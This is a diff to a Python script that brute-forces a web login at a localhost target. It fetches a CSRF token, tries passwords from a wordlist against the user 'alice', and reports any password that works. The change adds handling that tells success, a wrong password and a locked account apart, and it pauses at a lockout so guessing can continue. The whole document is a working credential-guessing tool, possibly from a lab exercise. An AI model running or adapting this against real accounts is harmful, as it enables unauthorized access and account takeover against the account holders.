@@ -1,5 +1,8 @@
 import re
 import requests
+import time
+
+from enum import Enum, auto
 
 TARGET = "http://localhost:4567"
 HEADERS = {
@@ -18,7 +21,15 @@ HEADERS = {
 }
 CSRF_TOKEN_PATTERN = r'"csrf_token":"(.*?)"'
 
-def try_login(user: str, password: str) -> bool:
+TARGET_USER = "alice"
+
+class ResponseType(Enum):
+    SUCCESS = auto()
+    WRONG_PASSWORD = auto()
+    LOCKED = auto()
+
+
+def try_login(user: str, password: str) -> ResponseType:
     session = requests.Session()
     session_headers = HEADERS.copy()
     r = session.get(f"{TARGET}/login", headers=session_headers)
@@ -39,15 +50,24 @@ def try_login(user: str, password: str) -> bool:
         "noscript": "false"
     })
 
-    return r.status_code == 200
+    if r.status_code == 200:
+        return ResponseType.SUCCESS
+    
+    if r.content.decode() == "[[error:account-locked]]":
+        return ResponseType.LOCKED
+    
+    return ResponseType.WRONG_PASSWORD
 
 def main():
     count = 1
     with open("wordlist.txt") as f:
         for line in f:
-            if try_login("admin", line.strip()):
+            response = try_login(TARGET_USER, line.strip())
+            if response == ResponseType.SUCCESS:
                 print(f"Found password: {line.strip()}")
                 break
+            if response == ResponseType.LOCKED:
+                input("Account Locked. Enter to continue guessing...")
             count += 1
             if count % 100 == 0:
                 print(f"Checked {count} passwords")
